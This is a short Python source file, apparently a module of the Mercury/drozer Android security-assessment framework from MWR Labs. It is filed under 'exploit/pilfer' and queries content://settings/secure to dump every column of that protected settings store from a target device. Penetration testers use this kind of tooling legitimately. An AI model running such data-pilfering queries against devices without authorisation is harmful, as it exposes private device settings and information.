from merc.lib.modules import Module


class SettingsSecure(Module):
    """Description: Read from content://settings/secure
Credit: Tyrone Erasmus - MWR Labs"""

    def __init__(self, *args, **kwargs):
        Module.__init__(self, *args, **kwargs)
        self.path = ["exploit", "pilfer", "general"]

    def execute(self, session, _arg):

        request = {}
        request['Uri'] = "content://settings/secure"
        request['showColumns'] = "true"

        print session.executeCommand("provider", "query", request).getPaddedErrorOrData()
